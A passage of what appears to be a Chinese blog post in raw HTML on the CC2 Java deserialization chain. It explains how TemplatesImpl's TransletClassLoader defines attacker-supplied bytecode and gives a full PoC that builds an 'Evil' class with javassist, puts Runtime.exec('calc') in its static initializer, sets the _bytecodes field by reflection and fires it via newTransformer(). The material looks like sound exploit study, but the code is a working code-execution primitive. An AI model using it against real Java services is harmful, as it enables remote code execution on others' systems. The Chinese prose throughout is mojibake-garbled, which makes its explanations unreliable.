class="hljs-comment">//2</span><br>Class clz = Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>);<br>Method defineClassMeth = clz.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class);<br>defineClassMeth.setAccessible(<span class="hljs-keyword">true</span>);<br>Class ac = (Class) defineClassMeth.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;myjavasec.Moonlight&quot;</span>, bytes, <span class="hljs-number">0</span>, bytes.length);<br>ac.newInstance();<br></code></pre></td></tr></table></figure>

<p>‰ΩÜÂõ†‰∏∫<code>ClassLoader.defineClass</code>ÊòØ<code>protected</code>ÁöÑÔºåÊàë‰ª¨Êó†Ê≥ïÈÄöËøáÂ§ñÈÉ®ËÆøÈóÆÔºå‰∏çËÉΩÁõ¥Êé•‰ΩøÁî®ÂèçÂ∞ÑË∞ÉÁî®</p>
<p>ÁÑ∂ËÄåÔºåÊÄªÊúâ‰∏Ä‰∫õÁ±ªÁöÑ<code>defineClass</code>ÊñπÊ≥ïÊòØË¢´Â∫ïÂ±ÇÁöÑÂÖ∂‰ªñÁ±ª‰ΩøÁî®Âà∞‰∫ÜÁöÑÔºåËøôÂ∞±ÊòØ<code>TemplatesImpl</code>ÁöÑÂÜÖÈÉ®Á±ª<code>TransletClassLoader</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransletClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ClassLoader</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;<br><br>     TransletClassLoader(ClassLoader parent) &#123;<br>         <span class="hljs-keyword">super</span>(parent);<br>        _loadedExternalExtensionFunctions = <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;<br>        <span class="hljs-keyword">super</span>(parent);<br>        _loadedExternalExtensionFunctions = mapEF;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class&lt;?&gt; ret = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-comment">// The _loadedExternalExtensionFunctions will be empty when the</span><br>        <span class="hljs-comment">// SecurityManager is not set and the FSP is turned off</span><br>        <span class="hljs-keyword">if</span> (_loadedExternalExtensionFunctions != <span class="hljs-keyword">null</span>) &#123;<br>            ret = _loadedExternalExtensionFunctions.get(name);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ret == <span class="hljs-keyword">null</span>) &#123;<br>            ret = <span class="hljs-keyword">super</span>.loadClass(name);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>     &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Access to final protected superclass member from outer class.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function">Class <span class="hljs-title">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span>[] b)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> defineClass(<span class="hljs-keyword">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Ëøô‰∏™Á±ªÈáåÈáçÂÜô‰∫Ü defineClass ÊñπÊ≥ïÔºåÂπ∂‰∏îËøôÈáåÊ≤°ÊúâÊòæÂºèÂú∞Â£∞ÊòéÂÖ∂ÂÆö‰πâÂüü„ÄÇJava ‰∏≠ÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåÂ¶ÇÊûú‰∏Ä‰∏™ ÊñπÊ≥ïÊ≤°ÊúâÊòæÂºèÂ£∞Êòé‰ΩúÁî®ÂüüÔºåÂÖ∂‰ΩúÁî®Âüü‰∏∫ default„ÄÇÊâÄ‰ª•‰πüÂ∞±ÊòØËØ¥ËøôÈáåÁöÑ defineClass Áî±ÂÖ∂Áà∂Á±ªÁöÑ protected Á±ªÂûãÂèòÊàê‰∫Ü‰∏Ä‰∏™ default Á±ªÂûãÁöÑÊñπÊ≥ïÔºåÂèØ‰ª•Ë¢´Á±ªÂ§ñÈÉ®Ë∞ÉÁî®„ÄÇ</p>
<p>ÂæÄÂâçÁúãË∞ÉÁî®ÁªìÊûÑ‰∏∫Ôºö</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span><span class="hljs-module"><span class="hljs-identifier">TransletClassLoader</span>.</span></span>defineClass<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span><span class="hljs-module"><span class="hljs-identifier">TransletClassLoader</span>.</span></span>defineTransletClasses<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletClasses()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br>        #TrAXFilter.<span class="hljs-constructor">TrAXFilter(Templates)</span> # CC3ÂàôÁî®Âà∞‰∫ÜTrAXFilterÁ±ª<br></code></pre></td></tr></table></figure>

<p>ËÄå<code>TemplatesImpl.getOutputProperties</code>Âíå<code>TemplatesImpl.newTransformer</code>ÈÉΩÊòØ publicÔºåÂèØ‰ª•Ë¢´Â§ñÈÉ®Ë∞ÉÁî®</p>
<p>ËÄå<code>getOutputProperties</code>ÊñπÊ≥ïÁ¨¶Âêà<code>JavaBean</code>ÁöÑ<code>getter</code>ÂÆö‰πâ</p>
<h4 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h4><p>Êàë‰ª¨Áé∞Âú®Ë¶ÅË∞ÉÁî®ËØªÂÖ•ÁöÑÂ≠óËäÇÁ†ÅÊï∞ÁªÑ<code>static</code>‰ª£Á†ÅÂùóÔºåÂπ∂‰∏îÂàùÂßãÂåñÔºåysoserial Áî®ÁöÑÊòØ<code>TemplatesImpl</code></p>
<p>Âú®<code>newTransformer</code>ÊñπÊ≥ïË∞ÉÁî®‰∫Ü<code>getTransletInstance</code>ÔºåÂΩì<code>_class</code>Êï∞ÁªÑ‰∏ç‰∏∫Á©∫Êó∂</p>
<ul>
<li>Ë∞ÉÁî®<code>defineTransletClasses</code>ÔºåÈÄöËøá<code>loader.defineClass</code>ËØªÂèñ‰∫ÜÂ≠óËäÇÁ†ÅÊï∞ÁªÑ</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>    _class[i] = loader.defineClass(_bytecodes[i]);<br>    <span class="hljs-keyword">final</span> Class superClass = _class[i].getSuperclass();<br><br>    <span class="hljs-comment">// Check if this is the main class</span><br>    <span class="hljs-keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;<br>        _transletIndex = i;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        _auxClasses.put(_class[i].getName(), _class[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>Ë∞ÉÁî®<code>newInstance</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();<br></code></pre></td></tr></table></figure>

<p>Ëøô‰∏§Ê≠•ÊàêÂäüÊâßË°åÂ≠óËäÇÁ†ÅÁöÑ static ‰ª£Á†ÅÂùó</p>
<p>ÊöÇÊó∂Áõ¥Êé•Ë∞ÉÁî®<code>TemplatesImpl.newTransformer</code>ÔºåÁºñÂÜô poc Â¶Ç‰∏ãÔºö</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2poc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span> <span class="hljs-params">(Object o, String fieldName,Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredField = clz.getDeclaredField(fieldName);<br>            declaredField.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredField.set(o,value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//ÁîüÊàêÁ±ª</span><br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br><br>        <span class="hljs-comment">//ÂÜôÂÖ•static‰ª£Á†Å</span><br>        ctc.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-comment">//ÁªßÊâøAbstractTransletÁ±ª</span><br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br><br>        <span class="hljs-comment">//ËΩ¨Êç¢‰∏∫Â≠óËäÇÁ†ÅÊï∞ÁªÑÔºåÁõ∏ÂΩì‰∫éËæìÂá∫‰∫ÜÂ≠óËäÇÁ†ÅÊñá‰ª∂‰∫Ü</span><br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br><br>        <span class="hljs-comment">//ÂÆû‰æãÂåñTemplatesImplÔºåÂèçÂ∞Ñ‰øÆÊîπÂõõ‰∏™Â±ûÊÄßÂÄº</span><br>        TemplatesImpl templatesimpl = TemplatesImpl.class.newInstance();<br>        <span class="hljs-comment">//TemplatesImpl templatesimpl = new TemplatesImpl();//‰πüÂèØ‰ª•ÈÄöËøáÊûÑÈÄ†ÊñπÊ≥ïÂÆû‰æãÂåñ</span><br><br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-keyword">null</span>);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,targetclassbytes);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        templatesimpl.newTransformer();<br>        <span class="hljs-comment">//templatesimpl.getOutputProperties();//‰πüÂèØ‰ª•ËøôÊ†∑Ëß¶Âèë</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ËøôÈáåÈÄöËøáÊñáÁ´†ÊûÑÈÄ†Âá∫Êù•‰∫ÜÂàùÊ≠• pocÔºåÂ≠òÁñëÔºö</p>
<ul>
<li>‰ªÄ‰πàÊòØÊ±†Ë∑ØÂæÑ</li>
</ul>
<blockquote>
<p><strong>ClassPool.getDefault</strong> ÈªòËÆ§‰ºöÊêúÁ¥¢ JVM ‰∏ãÈù¢Áõ∏ÂêåË∑ØÂæÑÁöÑÁ±ªÔºåÂπ∂ËøîÂõû ClassPool„ÄÇ‰ΩÜÊòØÔºåÂ¶ÇÊûú‰∏Ä‰∏™Á®ãÂ∫èËøêË°åÂú® Web Â∫îÁî®ÊúçÂä°Âô®‰∏äÔºåÂÉè JBoss Âíå Tomcat ÈÇ£ÁßçÔºå<strong>ClassPool</strong>ÂØπË±°ÂèØËÉΩÂ∞±Êâæ‰∏çÂà∞Áî®Êà∑ÊåáÂÆöÁöÑÁ±ª‰∫ÜÔºåÂõ†‰∏∫ web Â∫îÁî®ÊúçÂä°‰ΩøÁî®‰∫ÜÂ§ö‰∏™Á≥ªÁªüÁ±ªÂä†ËΩΩÂô®„ÄÇËøôÁßçÊÉÖÂÜµ‰∏ãÔºåÈúÄË¶ÅÁªô<strong>ClassPool</strong>Ê≥®ÂÜå‰∏Ä‰∏™È¢ùÂ§ñÁöÑ Class Ë∑ØÂæÑ„ÄÇÂ¶Ç‰∏ãÔºö</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(<span class="hljs-keyword">this</span>.getClass()));<br></code></pre></td></tr></table></figure>

<p>ËøôÂè•‰ª£Á†ÅÊ≥®ÂÜå‰∫Ü‰∏Ä‰∏™Á±ªÁöÑÁ±ªË∑ØÂæÑÔºåËøô‰∏™Á±ªÊòØ<strong>this</strong>ÊåáÂêëÁöÑÈÇ£‰∏™Á±ª„ÄÇ‰Ω†ÂèØ‰ª•‰ΩøÁî®‰ªªÊÑè<strong>Class</strong>‰ª£Êõø**this.getClass()**„ÄÇ</p>
<p>‰Ω†‰πüÂèØ‰ª•Ê≥®ÂÜå‰∏Ä‰∏™Êñá‰ª∂Â§π‰Ωú‰∏∫Á±ªË∑ØÂæÑ„ÄÇ‰æãÂ¶ÇÔºå‰∏ãÈù¢ËøôÊÆµ‰ª£Á†ÅÂ¢ûÊ∑ªÂèØ‰ª•‰∫ÜÊñá‰ª∂Â§π**/usr/local/javalib**Âà∞ÊêúÁ¥¢Ë∑ØÂæÑ‰∏≠Ôºö</p>
<p>ClassPool pool = ClassPool.getDefault();<br>pool.insertClassPath(‚Äú/usr/local/javalib‚Äù);</p>
<p>ÊêúÁ¥¢Ë∑ØÂæÑ‰∏ç‰ªÖÂèØ‰ª•ÊòØÁõÆÂΩïÔºåÁîöËá≥ÂèØ‰ª•ÊòØ URLÔºö</p>
<p>ClassPool pool = ClassPool.getDefault();<br>ClassPath cp = new URLClassPath(‚Äú<a target="_blank" rel="noopener" href="http://www.javassist.org&quot;/">www.javassist.org&quot;</a>, 80, ‚Äú/java/‚Äú, ‚Äúorg.javassist.‚Äù);<br>pool.insertClassPath(cp);</p>
<p>ËØ•‰ª£Á†ÅÂ¢ûÊ∑ª‰∫Ü<strong><a target="_blank" rel="noopener" href="http://www.javassist.org/java/">http://www.javassist.org:80/java/</a></strong> Âà∞Á±ªÊñá‰ª∂ÊêúÁ¥¢Ë∑ØÂæÑ‰∏ã„ÄÇËØ• URL ‰ªÖ‰ªÖÊêúÁ¥¢<strong>org.javassist.</strong> ÂåÖ‰∏ãÁöÑ class Êñá‰ª∂„ÄÇ‰æãÂ¶ÇÔºåË¶ÅÂä†ËΩΩ<strong>org.javassist.test.Main</strong> Ëøô‰∏™Á±ªÔºåjavassist ‰ºö‰ªéËøô‰∏™Âú∞ÂùÄ‰∏ãËé∑ÂèñËØ•Á±ªÊñá‰ª∂Ôºö</p>
<p><a target="_blank" rel="noopener" href="http://www.javassist.org/java/org/javassist/test/Main.class">http://www.javassist.org:80/java/org/javassist/test/Main.class</a></p>
<p>Ê≠§Â§ñÔºå‰Ω†‰πüÂèØ‰ª•Áõ¥Êé•Áªô<strong>ClassPool</strong>ÂØπË±°‰∏Ä‰∏™ byte Êï∞ÁªÑÔºåÁÑ∂ÂêéÁî®Ëøô‰∏™Êï∞ÁªÑÊûÑÂª∫<strong>CtClass</strong>ÂØπË±°„ÄÇË¶ÅËøôÊ†∑ÂÅöÔºåÁî®<strong>ByteArrayClassPath</strong>, ‰æãÂ¶ÇÔºö</p>
<p>ClassPool cp = ClassPool.getDefault();<br>byte[] b = a byte array;<br>String name = class name;<br>cp.insertClassPath(new ByteArrayClassPath(name, b));<br>CtClass cc = cp.get(name);</p>
<p>Ëé∑ÂæóÁöÑ<strong>CtClass</strong>ÂØπË±°Ë°®Á§∫‰∏Ä‰∏™Áî±<strong>b</strong>ÊåáÂÆöÁöÑÁ±ªÊñá‰ª∂ÂÆö‰πâÁöÑÁ±ª„ÄÇÂ¶ÇÊûúË∞ÉÁî®<strong>get()</strong> Ôºå<strong>ClassPool</strong>‰ºö‰ªé<strong>ByteArrayClassPath</strong>‰∏≠ËØªÂèñ‰∏Ä‰∏™ Class Êñá‰ª∂ÔºåÊåáÂÆöÁöÑ Class ÁöÑÂêçÂ≠óÂ∞±ÊòØ‰∏äÈù¢ÁöÑ<strong>name</strong>ÂèòÈáè„ÄÇ</p>
<p>Â¶ÇÊûú‰Ω†‰∏çÁü•ÈÅìËøô‰∏™Á±ªÁöÑÂÖ®ÈôêÂÆöÂêçÔºå‰Ω†ÂèØ‰ª•‰ΩøÁî®<strong>ClassPool</strong>‰∏≠ÁöÑ<strong>makeClass()</strong> :</p>
<p>ClassPool cp = ClassPool.getDefault();<br>InputStream ins = an input stream for reading a class file;<br>CtClass cc = cp.makeClass(ins);</p>
<p><strong>makeClass()</strong> ËøîÂõû‰∏Ä‰∏™ÈÄöËøáËæìÂÖ•ÊµÅÊûÑÂª∫Âá∫Êù•ÁöÑ<strong>CtClass</strong>„ÄÇ‰Ω†ÂèØ‰ª•‰ΩøÁî®<strong>makeClass()</strong> Áªô<strong>ClassPool</strong> ÂØπË±°Êèê‰æõ‰∏Ä‰∏™ÊØîËæÉÊÄ•ÁöÑ Class Êñá‰ª∂„ÄÇÂ¶ÇÊûúÊêúÁ¥¢Ë∑ØÂæÑÂåÖÂê´‰∫Ü‰∏Ä‰∏™ÂæàÂ§ßÁöÑ jar ÂåÖÔºåËøôÂèØ‰ª•ÊèêÈ´òÊÄßËÉΩ„ÄÇÂõ†‰∏∫<strong>ClassPool</strong>ÂØπË±°‰ºö‰∏Ä‰∏™‰∏Ä‰∏™ÊâæÔºåÂÆÉÂèØËÉΩ‰ºöÈáçÂ§çÊêúÁ¥¢Êï¥‰∏™ jar ÂåÖ‰∏≠ÁöÑÊØè‰∏Ä‰∏™ class Êñá‰ª∂„ÄÇ<strong>makeClass()</strong> ÂèØ‰ª•‰ºòÂåñËøô‰∏™ÊêúÁ¥¢„ÄÇ<strong>makeClass()<strong>ÊûÑÈÄ†Âá∫Êù•ÁöÑÁ±ª‰ºö‰øùÂ≠òÂú®</strong>ClassPool</strong>ÂØπË±°‰∏≠Ôºå‰Ω†‰∏ãÊ¨°ÂÜçÁî®ÁöÑÊó∂ÂÄôÔºå‰∏ç‰ºöÂÜçÊ¨°ËØª Class Êñá‰ª∂</p>
</blockquote>
<h4 id="AbstractTranslet"><a href="#AbstractTranslet" class="headerlink" title="AbstractTranslet"></a>AbstractTranslet</h4><ul>
<li>‰∏∫‰ªÄ‰πàËÆæÁΩÆÁà∂Á±ª‰∏∫<code>AbstractTranslet</code></li>
</ul>
<p><code>TemplatesImpl</code>‰∏≠ÂØπÂä†ËΩΩÁöÑÂ≠óËäÇÁ†ÅÊòØÊúâ‰∏ÄÂÆöË¶ÅÊ±ÇÁöÑÔºöËøô‰∏™Â≠óËäÇÁ†ÅÂØπÂ∫îÁöÑÁ±ªÂøÖÈ°ªÊòØ<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>ÁöÑÂ≠êÁ±ª</p>
<p>Âú®<code>TemplatesImpl.defineTransletClasses</code>ÊñπÊ≥ï‰∏≠Ôºå<code>_transletIndex</code>Âú®Âæ™ÁéØ‰ΩìÂà§Êñ≠Â≠óËäÇÁ†ÅÊòØÂê¶ÁªßÊâøËá™<code>AbstractTranslet</code>Âπ∂ËµãÂÄº iÔºõÂê¶ÂàôÊ≤°ÊúâËµãÂÄºÂàôÈªòËÆ§-1ÔºõËÄåÂú®Âæ™ÁéØ‰Ωì‰∏ãÈù¢ÁöÑÂà§Êñ≠ÔºåÂ¶ÇÊûúÂ∞è‰∫éÈõ∂‰ºöÊäõÂá∫ÂºÇÂ∏∏ÔºõÂõ†Ê≠§ÈúÄË¶ÅËÆæÁΩÆÂÖ∂Áà∂Á±ª‰∏∫<code>AbstractTranslet</code></p>
<ul>
<li>Âú®‰ΩøÁî® javaassit+TemplatesImplÔºå‰∏∫‰ªÄ‰πà‰º†ÂÖ•Ê±†Ë∑ØÂæÑÊòØ<code>AbstractTranslet.class</code></li>
</ul>
<p>Âú®‰ΩøÁî®<code>TemplatesImpl</code>Êó∂ÔºåÊèíÂÖ•Ê±†Ë∑ØÂæÑÁöÑÂÄº‰∏∫<code>AbstractTranslet.class</code>ÔºåÊòØÂõ†‰∏∫<code>TemplatesImpl</code>ÁªßÊâø‰∫Ü<code>AbstractTranslet</code>Á±ªÔºåÂπ∂‰∏îÂú®ÊâßË°å<code>transform()</code>ÊñπÊ≥ïÊó∂ÈúÄË¶ÅËÆøÈóÆ<code>AbstractTranslet</code>Á±ªÁöÑÂÆö‰πâ„ÄÇÂÖ∑‰ΩìÊù•ËØ¥Ôºå<code>TemplatesImpl</code>‰∏≠ÁöÑ<code>transform()</code>ÊñπÊ≥ï‰ºöË∞ÉÁî®<code>AbstractTranslet</code>Á±ª‰∏≠ÁöÑ<code>transform()</code>ÊñπÊ≥ïÊù•ÊâßË°å XSLT ËΩ¨Êç¢„ÄÇÂõ†Ê≠§ÔºåÂú®ÊûÑÈÄ†<code>TemplatesImpl</code>ÂÆû‰æãÊó∂ÔºåÈúÄË¶ÅÊèíÂÖ•<code>AbstractTranslet</code>Á±ªÁöÑÂÆö‰πâÂà∞Á±ªÊ±†Ë∑ØÂæÑ‰∏≠Ôºå‰ª•‰æøÂú®ÊâßË°å<code>transform()</code>ÊñπÊ≥ïÊó∂ËÉΩÂ§üÊâæÂà∞<code>AbstractTranslet</code>Á±ªÁöÑÂÆö‰πâ„ÄÇ<strong>ClassPool.getDefault</strong> ÈªòËÆ§‰ºöÊêúÁ¥¢ JVM ‰∏ãÈù¢Áõ∏ÂêåË∑ØÂæÑÁöÑÁ±ªÔºåÂπ∂ËøîÂõû ClassPool„ÄÇ‰ΩÜÊòØÔºåÂ¶ÇÊûú‰∏Ä‰∏™Á®ãÂ∫èËøêË°åÂú® Web Â∫îÁî®ÊúçÂä°Âô®‰∏äÔºåÂÉè JBoss Âíå Tomcat ÈÇ£ÁßçÔºå<strong>ClassPool</strong>ÂØπË±°ÂèØËÉΩÂ∞±Êâæ‰∏çÂà∞Áî®Êà∑ÊåáÂÆöÁöÑÁ±ª‰∫ÜÔºåÂõ†‰∏∫ web Â∫îÁî®ÊúçÂä°‰ΩøÁî®‰∫ÜÂ§ö‰∏™Á≥ªÁªüÁ±ªÂä†ËΩΩÂô®„ÄÇËøôÁßçÊÉÖÂÜµ‰∏ãÔºåÈúÄË¶ÅÁªô<strong>ClassPool</strong>Ê≥®ÂÜå‰∏Ä‰∏™È¢ùÂ§ñÁöÑ Class Ë∑ØÂæÑ„ÄÇËôΩÁÑ∂<code>TemplatesImpl</code>Âè™ÊòØÁªßÊâø‰∫Ü<code>AbstractTranslet</code>Á±ªÔºå‰ΩÜÊòØ<code>AbstractTranslet</code>Á±ªÊú¨Ë∫´‰πüÂåÖÂê´‰∫Ü‰∏Ä‰∫õÁî®‰∫éÊâßË°å XSLT ËΩ¨Êç¢ÁöÑÂü∫Êú¨ÊñπÊ≥ï„ÄÇÂõ†Ê≠§ÔºåÂú®ÊâßË°å XSLT ËΩ¨Êç¢Êó∂Ôºå<code>AbstractTranslet</code>Á±ªÁöÑÂÆö‰πâ‰πüÊòØÂøÖÈúÄÁöÑ„ÄÇÂõ†Ê≠§‰∏∫‰∫ÜÁ°Æ‰øù‰∏çÂá∫ÈîôÔºåÊ∑ªÂä†‰∏ÄÊù°È¢ùÂ§ñÁöÑ<code>AbstractTranslet</code>ÁöÑÊêúÁ¥¢Ë∑ØÂæÑÔºåÁ°Æ‰øù Javaassit ÁîüÊàê<code>TemplatesImpl</code>Â≠óËäÇÁ†Å‰∏çÂá∫Èîô</p>
<ul>
<li>ËÆæÁΩÆÁöÑÂõõ‰∏™Â±ûÊÄßÂÄº</li>
</ul>
<p>ËøõÂÖ•<code>defineTransletClasses</code>ÊñπÊ≥ï‰πãÂâçÊúâ‰∏§‰∏™Âà§Êñ≠</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (_name == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br><span class="hljs-keyword">if</span> (_class == <span class="hljs-keyword">null</span>) defineTransletClasses();<br></code></pre></td></tr></table></figure>

<p>ÊâÄ‰ª•<code>_name</code>ÈúÄË¶ÅËµãÂÄºÔºå<code>_class</code>ËµãÁ©∫</p>
<p>Ââ©‰∏ã‰∏§‰∏™Â±ûÊÄßÂú®<code>defineTransletClasses</code>ÊñπÊ≥ïÈáåÔºå<code>_bytecodes</code>‰∏∫Á©∫‰ºöÊäõÂá∫ÂºÇÂ∏∏ÔºåÂ∞ÜÂÖ∂ËµãÂÄº‰∏∫ÁõÆÊ†áÂ≠óËäÇÁ†Å<code>new byte[][]&#123;classbytes&#125;</code>(Ê≥®ÊÑèÂÆö‰πâ‰∏∫‰∫åÁª¥Êï∞ÁªÑÔºåÈúÄË¶ÅËΩ¨Êç¢)Ôºõ<code>_tfactory</code>ÊòØ<code>TransformerFactoryImpl</code>Á±ªÂÆö‰πâÁΩÆÁ©∫ÔºåÂõ†Ê≠§ËµãÂÄº‰∏∫<code>new TransformerFactoryImpl()</code></p>
